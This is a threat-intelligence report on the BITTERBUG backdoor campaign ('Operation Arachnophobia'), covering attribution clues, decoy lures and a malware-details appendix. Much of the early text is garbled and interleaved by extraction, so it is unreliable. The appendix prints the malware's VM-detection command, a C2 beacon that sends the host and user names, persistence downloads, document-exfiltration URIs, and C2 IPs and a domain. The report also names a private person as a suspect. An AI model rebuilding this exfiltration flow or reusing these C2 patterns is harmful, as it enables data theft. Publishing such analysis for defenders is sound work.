Indian Government pensionreferences
                             memorandum.to
Cath
                                                 As stated       in thedebug
 path.
                                                                          original  blog   It
(and
                                                                                                  is
important
                                                                                                         raised in theto
formal
                                                                                                                             note
Tranchulas
                                                                                                                                     that
 response), several
              
Cath
binaries contain               files
toare
                   
 references         
Cath
 support
                                                      in thecdebug
                                                              omponents
                                                                          path. It aisnd
 not
BITTERBUG
                                                                                       important         to note that vthe      ariants,
                                                                                                                                  
Cath
sfiles
                                                                                                                                             o
                                                                                                                                                        is
psupport
                                                                                                                                                               robable
                                                                                                                                                                         components and
              that
     t hese
notC:\Users\Tranchulas\Documents\Visual ere
 d  eveloped
    BITTERBUG variants, so it is probable that these were       b y
 a nother
                                                                             Studio  p arty
                                                                                    developed   b ut
                                                                                                     by another party but are a requiredf
component
                                                                                                         a re
 r equired
                                                                                              2008\Projects\upload\Release\upload.pdb  c omponent
         o  the
     of
 the family.
              family.
   C:\Users\Cath\documents\visual                               studio 2010\Projects\ExtractPDF\Release\ExtractPDF.pdb
   C:\Users\Cath\documents\visual
              
                                              studio 2010\Projects\Start\Release\Start.pdb
      C:\Users\Tranchulas\Documents\Visual
               
                                    Studio 2008\Projects\upload\Release\upload.pdb
      C:\Users\Cath\documents\visual        studiow2010\Projects\ExtractPDF\Release\ExtractPDF.pdb
               Additional
BITTERBUG
variants
  ere
compiled
June
July
2013
that
contained
      C:\Users\Cath\documents\visual studio 2010\Projects\Start\Release\Start.pdb
                        different
identifiers
debug
paths:
Cert-India
samples)
                 
umairaziz27
sample).41
presence
umairaziz27
debug
path
Additional BITTERBUG
                 Additional
                        from
                                                 variants       sBample
     ITTERBUG
            were                mcompiled       akes
                     variants
w                  inonder
   June           and
                                                                                                                                                                                                                                                                           were
   if
ctJuly      r2013
                                                                                                                                                                                                                                                                                                ompiled
                                                                                                                                                                                                                                                                                                his
              that
                                                                                                                                                                                                                                                                                                          epresents
          contained
                                                                                                                                                                                                                                                                                                                        in
June
   and
                                                                                                                                                                                                                                                                                                                                       an
            Jdifferent
                                                                                                                                                                                                                                                                                                                                                              uly
2013
                                                                                                                                                                                                                                                                                                                                                operational
                    identifiers
                                                                                                                                                                                                                                                                                                                                                                                         stecurity
     in the debug paths:
                                                                                                                                                                                                                                                                                                                                                                                                hat
contained
Cert-India
     different
                        mistake.
(3 samples)                                               iT   dentifiers
                                                                                                             he
    and          debug
       
umairaziz27
                  in
 path
    the
ebug
                         
umairaziz27
   (1 p  aths:
Cert-India
                                                                                                                                                                                                                                                                             sample).               41
                                                                                                                                                                                                                                                                                                                  led
ofT(
umairaziz27
                                                                                                                                                                                                                                                                                                        The presence                              3
samples)
                                                                                                                                                                                                                                                                                                                                              witter              42        
aLnd
  in a debug
                                                                                                                                                                                                                                                                                                                                                                                                inkedIn           43
 path from one
sample makes
umairaziz27
us wonder(ifon
                        accounts
                                                                                 thiswrepresents               hich
     (1
saample).                   
matching
          an operational                  41        
Tahe
                                                                                                                                                                                                                                                                             lias
presence
                                                                                                                                                                                                                                                                                            isecurity
                                                                                                                                                                                                                                                                                              s
used)
 mistake.   
umairaziz27
                                                                                                                                                                                                                                                                                                                otf
      The debug
                                                                                                                                                                                                                                                                                                                               belong
            to
path
                                                                                                                                                                                                                                                                                                                                                                 Tranchulas
  in
                                                                                                                                                                                                                                                                                                                                                                                  of a
umairaziz27
                                                                                                                                                                                                                                                                                                                                                                                          
debug
     path
 led us to Twitter42
                                                                                                                                                                                                                                                                                                                                                                                                        employee
and LinkedIn43from
     accounts
                        named
                               one
               U(on      smair
                                                                                                        ample
        which            Aziz,
         ma akes
             who
                                                                                                                                                                               matching                                                     walias
                                                                                                                                                                                                                                 dentified
             onder
       is used) hif
imself
                                                                                                                                                                                                                                                                                            this
                                                                                                                                                                                                                                                                                                thatrepresents
                                                                                                                                                                                                                                                                                                         belong
                                                                                                                                                                                                                                                                                                          as
Ito          a aTranchulas
                                                                                                                                                                                                                                                                                                                                        n
operational
                                                                                                                                                                                                                                                                                                                             nformation
                       employee
                                                                                                                                                                                                                                                                                                                                                                 Security
           security
                                                                                                                                                                                                                                                                                                                                                                                               Anamed
                                                                                                                                                                                                                                                                                                                                                                                                  nalystUmair    44 
Aziz, who
                 mistake.
identified himself      graduate
          as an Information                            The
    of
Ndational
              ebug
                    Security       path
       University
            oAnalyst  f
umairaziz27
               44oand
                                                                                                                                                                                                                                                                               f
Sciences
                                                                                                                                                                                                                                                                                           graduateaof          lnd
                                                                                                                                                                                                                                                                                                                 ed
  Tuechnology
                                                                                                                                                                                                                                                                                                                    National s
TUniversity
                                                                                                                                                                                                                                                                                                                                           witter 
(of    45  42     
                                                                                                                                                                                                                                                                                                                                                                       NUST).   SciencesLinkedIn
                                                                                                                                                                                                                                                                                                                                                                                               46  
Oand     43
                                                                                                                                                                                                                                                                                                                                                                                                                  f
these
 45 (NUST).46
                                                                                                                                                                                                                                                                                                                                                                                                         ne
oTechnology
                 accounts
One of these samples    samples
                                              was           (won
        as
                                                                                                               probably       wphich
     robably
                    used  a
matching
            uinsed
          attacks                 in
attacks
lias
                                                                                                                                                                                                                                                                            in late     is
summer
                                                                                                                                                                                                                                                                                               uin
                                                                                                                                                                                                                                                                                                   sed)
                                                                                                                                                                                                                                                                                                       late
t2013,
                                                                                                                                                                                                                                                                                                                 hat
                                                                                                                                                                                                                                                                                                                 summer
 belong
                                                                                                                                                                                                                                                                                                                               using2013,
     a
uTsing
                                                                                                                                                                                                                                                                                                                                                    
leaked       ranchulas
                                                                                                                                                                                                                                                                                                                                                                            report
             lureemployee
                                                                                                                                                                                                                                                                                                                                                                                   a
leaked
         report
                                                                                                                                                                                                                                                                                                                                                                                                         which             contained a decoy
                 named
                        lure
                                w
document related to Pakistan
s alleged inability to locate Osama Bin Laden.
                                                                               U
                                                                              hich
     mair
                 c               A
                                                                                                                            ontained
       ziz,
                     w              ho
     a        
                                                                                                                                                                                                                    d    dentified
                                                                                                                                                                                                                               ecoy
                              d          h    imself
                                                                                                                                                                                                                                                                           ocument
               r  a s
                                                                                                                                                                                                                                                                                                        elated
 I nformation
                                                                                                                                                                                                                                                                                                                          t  o
 P akistan
             S ecurity
                                                                                                                                                                                                                                                                                                                                                                 a     lleged
           A i  nalyst
                                                                                                                                                                                                                                                                                                                                                                                                nability
 44t
                 graduate
                        locate
Osama
                                                    of
National
                       Bin
Laden.
                                 University
Sciences
Technology45
(NUST).46
these
                 samples
                        
                                                              w             as
               p         robably
                                                      used
attacks
late
summer
2013,
using
leaked
report
                 lure
which
contained
decoy
document
          C:\Users\Cert-India\Documents\Visual                                                                                                                                                                                                                                                      related
2008\Projects\ufile\Release\ufile.pdb
                                                                                                                                                                                                                                                                                                Studio                  to
Pakistan
alleged
inability
                                                                
                 locate
Osama
Laden.
             C:\Users\umairaziz27\Documents\Visual                                                                                                                                                                                                                                                      Studio 2008\Projects\usb\Release\usb.pdb
                 
                        
         C:\Users\Cert-India\Documents\Visual
After publication       After
   of thepTCIRT                                  ublication
                              blog and                              of
tour                 he
communications    TCIRT
blog
                                               Studio
                                                                                                                                                                                                                                                                                               with     Tranchulas
                                                                                                                                                                                                                                                                                                    our
       2008\Projects\ufile\Release\ufile.pdb
                                                                                                                                                                                                                                                                                                             communications
    occurred in August            with
T2013,         ranchulas
   no new samples of 
            C:\Users\umairaziz27\Documents\Visual Studio 2008\Projects\usb\Release\usb.pdb
BITTERBUG oroccurred
      its supporticomponents                                                        n
August
2013,
                                                            (basednon                                        o
ncompile         ew
samples
     times) were             identified untiloSeptember
                                                                                                                                                                                                                                                                                                          of
BITTERBUG
                            r
support
         (various          support components) and
                                                                                                                                                                                                                                                                                                                                                                                                      components
October (a new   
 (based
BITTERBUG                                            on
compile
                   variant). Interestingly,                              times)
were
                                                                 theidentified
                                                                                                                                                                                                                                                                             samples compiled           until
Sfollowing
                                                                                                                                                                                                                                                                                                                          eptember
        the(blog     various
   publication    support
    used entirely new and generic
                 After
debug paths (Figure     components)
                          p
                                                                 11)       ublication
 as well a                                      asnd
           aof
      Otctober
                                                                                                                                                                        compilation     he
TCIRT
                                       (a
     tactic  nbew
 log
                                                                                                                                                                                                                                                                              toBaconceal
                                                                                                                                                                                                                                                                                        nd
                                                                                                                                                                                                                                                                                      ITTERBUG
        communications
                                                                                                                                                                                                                                                                                                                 C2variant).
                                                                                                                                                                                                                                                                                                                          address from                         with
analysis.
                                                                                                                                                                                                                                                                                                                                              Interestingly,
                                                                                                                                                                                                                                                                                                                                                              static              Tranchulas
  samples
                                                                                                                                                                                                                                                                                                                                                                                                       Between              September and
                 occurred
                        compiled
                                                            i    n
                                                                                                         f         A
                                                                                                              ollowing
December, we observed more variations of BITTERBUG and its support components in terms of packaging, host-based
                                                                                                                               ugust
                                      2        t  013,
                                                                                                                                                                                             he
                  b           n
                                                                                                                                                                                                                                log
    o
          n   p  ew
       s amples
                                                                                                                                                                                                                                                                    ublication
                   u  o f
                                                                                                                                                                                                                                                                                                        sed
 B ITTERBUG
                                                                                                                                                                                                                                                                                                                  e  ntirely
         n   ew
 o   r
                                                                                                                                                                                                                                                                                                                                                         a    i ts
                                                                                                                                                                                                                                                                                                                                                               nd
  s g  upport
                                                                                                                                                                                                                                                                                                                                                                                eneric
        c
                                                                                                                                                                                                                                                                                                                                                                                                  d    omponents
                                                                                                                                                                                                                                                                                                                                                                                                       ebug
   paths
 activities,
                 (based
                        (Figure
                                            on
     11)
     compile
        as
well
                                 times)
  as
compilation
                   were
identified
                                    tactic
  until
   September
                                                                                                                                                                                                                                                                                                         to
conceal
             the
   various
                                                                                                                                                                                                                                                                                                                                                              address
          support
                                                                                                                                                                                                                                                                                                                                                                                         from
static
                 components)
                        analysis.
Between
                                                                                 and
OSctober
                                  eptember
                                     (a
                  and
BDITTERBUG
                                                                                                                                                                                                                                                                                        ecember,
w              variant).
                                                                                                                                                                                                                                                                                                                        e
observed
  Interestingly,
                                                                                                                                                                                                                                                                                                                                                         more
variations
               the
samples
                                                                                                                                                                                                                                                                                                                                                                                                           of
      http://curl.haxx.se/libcurl/
                 compiled
                        
ollowing
                                                                                                         
                                                                                                                                                                                          
                                                                                                                                                                                                                            
ublication
used
entirely
generic
debug
paths
      Appendix A: Malware Details
                 (Figure
                        41
Appendix
                                         11)
Mwalware
                                   ell
Daetails                                 
compilation
              
                                      tactic
conceal
address
from
static
      https://twitter.com/umairaziz27
                 analysis.
                        42
https://twitter.com/umairaziz27                               Between
September
December,
observed
more
variations
      http://pk.linkedin.com/in/umairaziz27
                 
                         
ttp://pk.linkedin.com/in/umairaziz27
                                                      
                                
      https://twitter.com/umairaziz27/status/332049978878996481
                               
hppendix
                                                     A:
Malware
Details
                 41     44                            ttps://twitter.com/umairaziz27/status/332049978878996481                                                                                                                                                                                                                                     
www.nust.edu.pk
                 42     45     
w                ww.nust.edu.pk
                                               ttps://twitter.com/umairaziz27                                                                                                                                                                                    
      http://www.nust.edu.pk/INSTITUTIONS/Directortes/ilo/Download%20Section/Graduate%20Profile%20SEECS%20%20BICSE.pdf
                 43     46                     ttp://pk.linkedin.com/in/umairaziz27
                               
hhttp://www.nust.edu.pk/INSTITUTIONS/Directortes/ilo/Download%20Section/Graduate%20Pro
                 44     file%20SEECS%20%20BICSE.pdf
                               
https://twitter.com/umairaziz27/status/332049978878996481                                                                                                                                                             
                                                                                 
                 45
www.nust.edu.pk
                                             46http://www.nust.edu.pk/INSTITUTIONS/Directortes/ilo/Download%20Section/Graduate%20Pro
                                                           
                                                                                                                                                                                                                                                                                                                    
9              
             OPERATION    ARACHNOPHOBIA
                                file%20SEECS%20%20BICSE.pdf
                  BITTERBUG
support
components
terms
packaging,
host-
based
                  activities,
decoys
lack
them)
compared
samples
before
blog
and decoys (or thepost.
                       lack T
                            ofhis
                               them)  could
                                        comparedindicate
                                                     to the  that
                                                               samplesthe
threat
                                                                              before aour
                                                                                        ctors
                                                                                          blogwpost.
                                                                                                  ere
aThisware
                                                                                                                 could of
indicate
                                                                                                                              the
blog
                                                                                                                                         that post
 and
 actors were aware
                                                                                                                                                the threat
                  modified
   t    heir
 m alware
 a nd
 r elated
 c omponents
  t o
of the blog post and modified their malware and related components to distance them from prior indicators. d istance
 t    hem
 f rom
 p rior
                  indicators.
                  
                                                                   C:\Intel\Logs\file.pdb
                                                                  Figure
Generic
Debug
Path
                  
                                            Figure 11: Generic Debug Path
                  Between
December
2013
late
March
2014,
observed
several
lures
used
                  in
BITTERBUG
self-
extracting
(SFXRAR)
files.
from
December
contained
Between December 2013 and late March 2014, we observed several new lures used in BITTERBUG self-extracting RAR (SFXRAR)
                  several
BITTERBUG
variants
used
decoy
document
(Figure
related
files. One from December        contained
                  the
December
          several
                                             arrest
BITTERBUG        variants and used
                                                               Devyani
Khobragade,              47
aIndian
                                                                                                                 decoy PDF          document
                                                                                                                           diplomat
                  (Figure
                                                                                                                                              in
        12) related to the
                                                                                                                                                              United
December arrest States.
                     of DevyaniIn
spring
2014,
observed
SFXRAR
file
with
filename
lure
related
athe
                                     Khobragade,       47
                                                             an Indian   diplomat      in   the United      States.    In   spring       2014,      we       observed       SFXRAR file
with a filename lure    related
                  March
        to thedisappearance
                               2014
      March 2014 disappearance
                                                                   of
Malaysia
 of A
                                                                                         Malaysia
                                                                                             irlines
Airlines
                                                                                                          Flight
Flight
                                                                                                                    370 370 48           (cast
                                                                                                                               
(cast
                                                                                                                                      48
                                                                                                                                             as
Paakistan-
                                                                                                                                                              Pakistan-related hijacking).
                  related
This SFXRAR contained           hijacking).
                              the   latest BITTERBUG This
SFXRAR
                                                                 variant, c   ontained
                                                                            which     had new  the
dependencies
                                                                                                       latest
BITTERBUG
                                                                                                                            on support    variant,
                                                                                                                                               components.     which
Interestingly,
                                                                                                                                                                         had
       this
                  new
  d ependencies
         o n
 s upport
 c omponents.
       I nterestingly,
SFXRAR
s filename was the only lure element related to the MH370 event; it did not contain a decoy document. We provide a   t his
 S FXRAR
          f ilename
                  was
more detailed report     onthe
                             thisoSFX
                                    nly
land
                                            ure
                                                    element
                                                       related rvariant
                                                                   elated
intAppendix
                                                                                o
MH370
                                                                                                A: Malwareevent;
contain
decoy
                                                                                                                   Details.
                  document.
provide
more
detailed
report
this
related
variant
                  Appendix
Malware
Details.
                  
                                                                                                                                                                                                                                                           
                        
                                             Figure 12: Screenshot of Indian diplomat arrest decoy PDF
                        47
http://world.time.com/2013/12/18/us-to-review-devyani-khobragade-arrest-and-strip-search/ 
             48http://www.businessinsider.com/mh370-investigators-find-evidence-of-a-mysterious-power-
             outage-during-the-early-part-of-its-flight-2014-6
BITTERBUG continued to rely on the same network behaviors to communicate with its C2s. Connections to its C2 nodes relied on
PHP and used communications that included 
.php?compname=
 and 
.php?srs=
, as well as direct file/component retrieval
                                                                                                           
also
from the C2s. Though many of the samples that we have observed use direct IPs for HTTP communications, we have
observed more limited use of a No-IP domain.
         http://world.time.com/2013/12/18/us-to-review-devyani-khobragade-arrest-and-strip-search/
         http://www.businessinsider.com/mh370-investigators-find-evidence-of-a-mysterious-power-outage-during-the-early-part-of-its-flight-2014-6
10      
      OPERATION ARACHNOPHOBIA
Conclusion
Operation Arachnophobia consists of an apparent targeted exploitation campaign, dating back to early 2013, using the
BITTERBUG malware family and seemingly directed against entities involved in India-Pakistan issues. The threat actor appears to
have exclusively used VPSNOC, a probable Pakistan-based VPS service provider who leased U.S. hosting services, for both the
delivery and C2 phases of attack. Research later identified that a Pakistan-based VPSNOC representative had a social network
affiliation with a Tranchulas employee as well as apparent affiliations with the Anonymous and AntiSec movements.
After the August 6, 2013 blog, Tranchulas provided TCIRT and the media an official statement and explanation of BITTERBUG
activity, however, this explanation contained discrepancies. The TCIRT addressed some of these discrepancies with Tranchulas
personnel, who were unresponsive, increasing our suspicion of the activity. We later observed BITTERBUG activity following
August 2013 with subtle changes that further generalized debug paths. It was this chain of events that served as a catalyst for
extra scrutiny of the activity and collaboration between the ThreatConnect and FireEye Labs teams to share information.
While we are not conclusively attributing BITTERBUG activity to Tranchulas or a specific Pakistani entity, we can confidently point
to many characteristics of a Pakistan-based cyber exploitation effort that is probably directed against Indian targets or those who
are involved in India-Pakistan issues. Many of the notable characteristics of the BITTERBUG activity suggest that this is indeed
part of a Pakistan-based cyber exploitation effort that has apparently attempted to obfuscate its malware characteristics and
origins (behind U.S. infrastructure), before and after public disclosure in August 2013.
On the surface, BITTERBUG serves as an example of how threat actors mask their operations across social, cultural and
geographic boundaries. More importantly, it demonstrates the value of threat intelligence sharing and industry collaboration. As
one organization begins to pull at a thread of evidence and share their findings with another, a larger understanding and shared
perspective is revealed. It is through this process that a shared awareness emerges into a larger, more comprehensive story that
explains what we are seeing and why - ultimately it is this story that better serves us all.
11   
   OPERATION ARACHNOPHOBIA
APPENDIX
APPENDIX A: Malware Details
BITTERBUG
BITTERBUG is a backdoor executable capable of uploading and downloading files, listing running processes, generating file listings,
and automatically transferring selected files to its command and control (C2) server. BITTERBUG appears to be virtual machine aware
and may not execute on a VMWare or VirtualBox VM. We have observed BITTERBUG installed by a self-extracting RAR archive
disguised as a screensaver. Upon execution, the self-extracting RAR archive may extract configuration files, dependency DLLs, and
the BITTERBUG executable. The timeline below is of BITTERBUG activity from May 2013 through March 2014.
                             Timeline of BITTERBUG characteristics vs.ThreatConnect events
12   
   OPERATION ARACHNOPHOBIA
Details
Upon execution the self-extracting RAR may install <BITTERBUG>.exe and the following DLLs:
 libcurld.dll 
 Used for downloading and uploading files
 msvcm90d.dll 
 C runtime library
 msvcp90d.dll 
 C runtime library
 msvcr90d.dll 
 C runtime library
The self-extracting RAR may install the following benign configuration files:
 Microsoft.VC90.DebugCRT.manifest 
 Compilation artifact
 BtcirEt.DZU 
 Self-extracting RAR configuration file
 SJeXSrA.KNX 
 Self-extracting RAR configuration file
 VCAKSQl.TNT 
 Self-extracting RAR configuration file
BITTERBUG first may execute the following Windows Management Instrumentation (WMI) command to detect the presence of a
virtual machine (VM):
 cmd.exe /c wmic diskdrive list brief >
%APPDATA%\Microsoft\recovery.txt
BITTERBUG then may open recovery.txt and check for the presence of strings VBox or VMware. The backdoor then may
enter an infinite sleep loop if recovery.txt contains either one of the aforementioned strings (Example in Figure 13).
                            Figure 13: Example recovery.txt file from VMware virtual machine
Next BITTERBUG typically will beacon to the C2 server by sending the computer name and username of the compromised
system. An example beacon request is shown in Figure 14.
               POST /path_active.php?compname=<%COMPUTERNAME%>_<%USERNAME%> HTTP/1.1
               Host: <c2_location>
               Accept: */*
               Content-Length: 25
               Content-Type: application/x-www-form-urlencoded
               <%COMPUTERNAME%>_<%USERNAME%>
                                                    Figure 14: Initial C2 beacon
13   
    OPERATION ARACHNOPHOBIA
BITTERBUG then may perform an HTTP GET request for the following URI:
http://<c2_location>/checkpkg.php?compname=<%COMPUTERNAME%>_<%USERNAME%>
If the C2 server responds with a filename, the filename received is deleted from %APPDATA%\Microsoft<FILE_NAME_FROM_
C2>. The purpose of this command might be to delete older versions of BITTERBUG, although we have not observed this
command occurring in the wild.
BITTERBUG then may attempt to download the files listed in Table 1. The purpose of the first three files is unknown. The final two
files are downloaded to the user
s Startup directory and executed at startup in order to maintain persistence.
                           Request URI                                                    Download Path
      http://<c2_location>/versionchk.php?srs=436712384                            %APPDATA%\Microsoft\file.exe
           http://<c2_location>/vtris.php?srs=436712384                         %APPDATA%\Microsoft\percf001.dat
          http://<c2_location>/vtris1.php?srs=436712384                         %APPDATA%\Microsoft\percf002.dat
      http://<c2_location>/is_array_max.php?compname=                         %USERPROFILE%\Start Menu\Programs\
           <%COMPUTERNAME%>_<%USERNAME%>                                                Startup\wincheck.exe
         http://<c2_location>/is_array_pal.php?compname=                      %USERPROFILE%\Start Menu\Programs\
           <%COMPUTERNAME%>_<%USERNAME%>                                                 Startup\winsquirt.exe
                                           Table 1: Files downloaded by the backdoor
Next, BITTERBUG may scan through each drive letter and search recursively for files with the following file extensions: .doc,
.ppt, .xls, .pdf, .docx, .pptx, .pps, .xlsx
BITTERBUG then typically creates a file list containing all documents (excluding those whose filename contains MediaUtils) to
the following locations:
 %APPDATA%\Microsoft\plang006.txt
 %APPDATA%\Microsoft\tlang006.txt
BITTERBUG may also write a list of all running processes to:
 %APPDATA%\Microsoft\prc.dat
Finally, BITTERBUG typically uploads the running process list, document file list, and all documents to the following URI:
 http://<c2_location>/fetch_updates_flex.php?compname=<%COMPUTERNAME%>_<%USERNAME%>
Host-Based Signatures
File System Residue
BITTERBUG may be extracted along with the following embedded files:
 %USERPROFILE%\5rv3fgk6\<BITTERBUG>.exe
 %USERPROFILE%\5rv3fgk6\libcurld.dll
 %USERPROFILE%\5rv3fgk6\msvcm90d.dll
 %USERPROFILE%\5rv3fgk6\msvcp90d.dll
 %USERPROFILE%\5rv3fgk6\msvcr90d.dll
 %USERPROFILE%\5rv3fgk6\Microsoft.VC90.DebugCRT.manifest
14   
     OPERATION ARACHNOPHOBIA
 %USERPROFILE%\5rv3fgk6\SJeXSrA.KNX
 %USERPROFILE%\5rv3fgk6\BtcirEt.DZU
 %USERPROFILE%\5rv3fgk6\VCAKSQl.TNT
The malware may create the following files:
 %APPDATA%\Microsoft\recovery.txt
 %APPDATA%\Microsoft\plang006.txt
 %APPDATA%\Microsoft\tlang006.txt
 %APPDATA%\Microsoft\prc.dat
 %APPDATA%\Microsoft\file.exe
 %APPDATA%\Microsoft\percf001.dat
 %APPDATA%\Microsoft\percf002.dat
 %USERPROFILE%\Start Menu\Programs\Startupwincheck.exe
 %USERPROFILE%\Start Menu\Programs\Startup\winsquirt.exe
Network-Based Signatures
 The malware typically communicates on TCP port 80:
 The malware may perform HTTP requests for the following URIs:
     
 http://<c2_location>/checkpkg.php?compname=<%COMPUTERNAME%>_<%USERNAME%>
     
 http://<c2_location>/is_array_max.php?compname=<%COMPUTERNAME%>_<%USERNAME%>
     
 http://<c2_location>/is_array_pal.php?compname=<%COMPUTERNAME%>_<%USERNAME%>
     
 http://<c2_location>/path_active.php?compname=<%COMPUTERNAME%>_<%USERNAME%>
     
 http://<c2_location>/fetch_updates_flex.php?compname=<%COMPUTERNAME%>_<%USERNAME%>
     
 http://<c2_location>/versionchk.php?srs=436712384
     
 http://<c2_location>/vtris.php?srs=436712384
     
 http://<c2_location>/vtris1.php?srs=436712384
File Manipulations
We observed other interesting operational security-oriented challenges in the post-blog post samples. In one case, an actor
appeared to manually null out the 
Cert-India
 user directory in one of the file paths (see figures 15 and 16 below) contained in
two binaries (support components). These files shared the same import hash (4e96e86db5a8a025b996aefdc218ff74) and were
virtually the same files minus modification to a few bytes in the second sample.
                           Figure 15: Original file content for 7588ff900e32145cbcbc77837237aef8
15   
    OPERATION ARACHNOPHOBIA
                                          Figure 16: Nulled file path for 26616e6662b390ebdb588cdaaae5e4f6
As these samples point to, we also observed use of the C++ Boost libraries, which introduced a new file path to monitor for
operational security purposes. We observed at least one case in which files mixed old and new file paths, as seen in the figures 17
and 18 below.
                                                                                                                                                                                     
                                                       Figures
Screenshots
from
locations
                 Figures 17 and 18: Screenshots from                6e8c4d2d5d4e5e7853a1842b04a6bfdf
                                                                            two locations in 6e8c4d2d5d4e5e7853a1842b04a6bfdf
                                                                                                        
                          In
both
cases,
possible
that
actors
intentionally
this
attempt
In both cases, it is possible   that the
                          mislead
       actors intentionally
                                         further
    research
edid        this iin
                                                                            fforts
    an pattempt
                                                                                        nto
              to mislead
                                                                                                 ost-
blog
  samples
 further   research
                                                                                                                                or
cast
        efforts o
                                                                                                                                               suspicion
     inton
post-
                                                                                                                                                                            Cert-
                          India
blog samples or cast suspicion       as
Cert-India
                                           a
more-
revealing
         element.
Felement.
                                                                as a more-revealing             or
example,
 analysis
                                                                                                             For example,           of
files
                                                                                                                                analysis            deployed
                                                                                                                                             of files   deployed alongside
                          alongside
the nulled-out 
Cert-India
                 the
nulled-
                               sample mentioned                           
Cert-
India
                                                              above revealed          a lack of sample
                                                                                                  concern      mover
                                                                                                                 entioned
    above
                                                                                                                          the same     string. revealed
                                                                                                                                                 Alternatively,a
lack
                                                                                                                                                                        these of
                          concern
    o  ver
 t he
 s ame
inconsistencies could also indicate sloppy tradecraft and/or teamwork. s tring.
 A lternatively,
      t hese
 i nconsistencies
        c ould
 a lso
   i ndicate
                          sloppy
tradecraft
and/or
teamwork.
                          
                       C:\Users\Cert-
                       India\Documents\boost_1_53_0\boost/thread/win32/thread_primitives.hpp
                                   
                                   
                                   
                                              
16      
     OPERATION ARACHNOPHOBIA
APPENDIX B: MD5 Hashes and Malware Table
BITTERBUG Hashes
                        MD5                                  File Size (bytes)                Compile Time
          be7de2f0cf48294400c714c9e28ecdd1                         158720                  2013-05-08T10:58:22Z
          fd3a713ebf60150b99fb09de09997a24                         158208                  2013-05-10T19:18:54Z
          03f528e752dee57b1ff050a72d30de60                         158208                  2013-05-23T17:21:19Z
          801c8bac8aea4d0226e47551c808a331                         169984                  2013-06-14T13:53:13Z
          a21f2cb65a3467925c1615794cce7581                         172032                  2013-06-25T13:04:04Z
          35663e66d02e889d35aa5608c61795eb                         171520                  2013-07-09T10:16:00Z
          328adb01fb4450989ee192107a765792                         173056                  2013-08-01T17:28:54Z
          8878162cf508266f6be1326da20171df                         267776                  2013-10-24T09:28:23Z
          5ccb43583858c1c6f41464ee21a192ba                         225792                  2013-12-06T10:02:36Z
          44abc22162c50fcc8dc8618241e3cd1a                         169472                  2013-12-26T09:19:40Z
          6e8c4d2d5d4e5e7853a1842b04a6bfdf                         480256                  2013-12-30T13:11:23Z
          828d4a66487d25b413cb19ef8ee7c783                         171520                  2014-03-17T08:16:25Z
BITTERBUG and Support Component Debug Strings (in order of first use)
 Compile Time            Debug Paths
 2013-05-08T10:58:22Z    C:\Users\Tranchulas\Documents\Visual Studio 2008\Projects\upload\Release\upload.pdb
 2013-05-10T19:18:54Z    C:\Users\Tranchulas\Documents\Visual Studio 2008\Projects\upload\Release\upload.pdb
 2013-05-23T17:21:19Z    C:\Users\Tranchulas\Documents\Visual Studio 2008\Projects\upload\Release\upload.pdb
 2013-05-28T11:59:36Z    C:\Users\Cath\documents\visual studio 2010\Projects\ExtractPDF\Release\ExtractPDF.pdb
 2013-05-30T08:48:04Z    C:\Users\Cath\documents\visual studio 2010\Projects\Start\Release\Start.pdb
 2013-06-13T08:34:21Z    C:\Users\Cath\documents\visual studio 2010\Projects\ExtractPDF\Release\ExtractPDF.pdb
 2013-06-14T13:53:13Z    C:\Users\Cert-India\Documents\Visual Studio 2008\Projects\ufile\Release\ufile.pdb
 2013-06-25T13:04:04Z    C:\Users\umairaziz27\Documents\Visual Studio 2008\Projects\usb\Release\usb.pdb
 2013-07-09T10:16:00Z    C:\Users\Cert-India\Documents\Visual Studio 2008\Projects\ufile\Release\ufile.pdb
 2013-08-01T17:28:54Z    C:\Users\Cert-India\Documents\Visual Studio 2008\Projects\ufile\Release\ufile.pdb
 2013-10-24T09:28:23Z    C:\Intel\Logs\file.pdb
 2013-12-06T10:02:36Z    C:\Intel\Logs\logs.pdb
 2013-12-26T09:19:40Z    C:\Intel\Logs\file.pdb
 2013-12-30T13:11:23Z    C:\Intel\Logs\file.pdb
 2014-03-17T08:16:25Z    C:\Intel\Logs\file.pdb
17   
   OPERATION ARACHNOPHOBIA
BITTERBUG Import Hashes
                         Imphash                   Compile Time
             610893cd57631d1708d5efbc786bd9df    2013-05-08T10:58:22Z
             5b1bebadb5713018492b1973ab883c25    2013-05-10T19:18:54Z
             5b1bebadb5713018492b1973ab883c25    2013-05-23T17:21:19Z
             cf63bfee568869182bd91a3cb8e386ce    2013-06-14T13:53:13Z
             ccca290b8ab75a5b29f61847fb882c20    2013-06-25T13:04:04Z
             cf63bfee568869182bd91a3cb8e386ce    2013-07-09T10:16:00Z
             435bd4f04b2ee7cb05ce402f2bcea85e    2013-08-01T17:28:54Z
             2458ee58d046f14cad685e6c9c66f109    2013-10-24T09:28:23Z
             c47d4980c1c152eba335bed5076e8a6f    2013-12-06T10:02:36Z
             bd0665ffedcf2a9ded36a279d08e4752    2013-12-26T09:19:40Z
             58758cb068583736ef33a09a2c4665de    2013-12-30T13:11:23Z
              5b943bec7d2a589adfe0d3ff2a30bfe5   2014-03-17T08:16:25Z
18   
   OPERATION ARACHNOPHOBIA
BITTERBUG Network Communications
 HTTP Requests
 http://<c2_location>/checkpkg_maxell.php?compname=
 http://<c2_location>/checkpkg_petal.php?compname=
 http://<c2_location>/checkpkg.php?compname=
 http://<c2_location>/fetch_updates_8765_tb.php?compname=
 http://<c2_location>/fetch_updates_flex.php?compname=
 http://<c2_location>/fetch_updates_m.php?compname=
 http://<c2_location>/fetch_updates_petal.php?compname=
 http://<c2_location>/fetch_updates_pops.php?compname=
 http://<c2_location>/fetch_updates_pret.php?compname=
 http://<c2_location>/is_array_max.php?compname=
 http://<c2_location>/is_array_own.php?compname=
 http://<c2_location>/is_array_pal.php?compname=
 http://<c2_location>/is_array.php?compname=
 http://<c2_location>/maxell_active.php?compname=
 http://<c2_location>/path_active.php?compname=
 http://<c2_location>/petal_active.php?compname=
 http://<c2_location>/version_maxell.php?srs=
 http://<c2_location>/version_own.php?srs=
 http://<c2_location>/version_petal.php?srs=
 http://<c2_location>/versionchk.php?srs=
 http://<c2_location>/vtris.php?srs=
 http://<c2_location>/vtris1.php?srs=
 http://<c2_location>/fetch_updates_8765.php?compname=
BITTERBUG Domain & IPs
 C2s
 199.91.173.43
 199.91.173.44
 199.91.173.45
 windowsupdate.no-ip.biz
19   
   OPERATION ARACHNOPHOBIA
APPENDIX C: VPSNOC Email Header Analysis
The Kansas-City-based hosting provider sent an introductory email message on July 24th, 2013 at 1500 CDT and would be
received by TCIRT at 1400 EDT and VPSNOC on Thursday July 25th, 2013 at 1200 PKT. 49
